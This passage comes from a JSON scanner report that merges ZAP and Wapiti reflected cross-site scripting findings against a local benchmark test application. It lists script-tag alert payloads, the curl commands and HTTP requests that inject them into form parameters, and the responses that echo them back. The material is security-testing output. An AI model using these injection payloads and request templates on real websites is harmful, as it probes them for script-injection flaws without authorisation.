                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w6lun9xtlj')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w6lun9xtlj')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02241\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02241.html?BenchmarkTest02241=SafeText\" -d \"BenchmarkTest02241=SafeText&BenchmarkTest02241=Movies&BenchmarkTest02241=Writing&BenchmarkTest02241=%3CScRiPt%3Ealert%28%27w6lun9xtlj%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02241"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02241', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02241.html?BenchmarkTest02241=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyMjQxPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02241', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02241.html?BenchmarkTest02241=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02241=SafeText&BenchmarkTest02241=Movies&BenchmarkTest02241=Writing&BenchmarkTest02241=%3CScRiPt%3Ealert%28%27w6lun9xtlj%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:10 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w6lun9xtlj')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02396",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02396?BenchmarkTest02396=%3CScRiPt%3Ealert%28%27wxr6nj05yz%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wxr6nj05yz')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wxr6nj05yz')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02396\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02396.html?BenchmarkTest02396=SafeText\" -d \"BenchmarkTest02396=%3CScRiPt%3Ealert%28%27wxr6nj05yz%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02396"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02396', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02396.html?BenchmarkTest02396=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyMzk2PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02396', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02396.html?BenchmarkTest02396=SafeText', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02396=%3CScRiPt%3Ealert%28%27wxr6nj05yz%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:16 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wxr6nj05yz')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02399",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02399?secure=default&productID=default&foo=foo&BenchmarkTest02399=%3CScRiPt%3Ealert%28%27w0k9p6xjvz%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w0k9p6xjvz')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w0k9p6xjvz')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02399\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02399.html?BenchmarkTest02399=SafeText\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest02399=%3CScRiPt%3Ealert%28%27w0k9p6xjvz%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02399"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02399', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02399.html?BenchmarkTest02399=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAyMzk5PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02399', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02399.html?BenchmarkTest02399=SafeText', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest02399=%3CScRiPt%3Ealert%28%27w0k9p6xjvz%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:02 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:18 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w0k9p6xjvz')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02400",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02400?BenchmarkTest02400=SafeText&BenchmarkTest02400=Movies&BenchmarkTest02400=Writing&BenchmarkTest02400=%3CScRiPt%3Ealert%28%27we8mmp5mjd%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('we8mmp5mjd')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('we8mmp5mjd')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02400\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02400.html?BenchmarkTest02400=SafeText\" -d \"BenchmarkTest02400=SafeText&BenchmarkTest02400=Movies&BenchmarkTest02400=Writing&BenchmarkTest02400=%3CScRiPt%3Ealert%28%27we8mmp5mjd%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02400"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02400', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02400.html?BenchmarkTest02400=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyNDAwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02400', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02400.html?BenchmarkTest02400=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02400=SafeText&BenchmarkTest02400=Movies&BenchmarkTest02400=Writing&BenchmarkTest02400=%3CScRiPt%3Ealert%28%27we8mmp5mjd%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:26:25 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('we8mmp5mjd')</sCrIpT>.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02403",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02403?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02403=%3CScRiPt%3Ealert%28%27whbk7ztbjk%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('whbk7ztbjk')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('whbk7ztbjk')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02403\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02403.html?BenchmarkTest02403=SafeText\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02403=%3CScRiPt%3Ealert%28%27whbk7ztbjk%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02403"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02403', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02403.html?BenchmarkTest02403=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDI0MDM9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
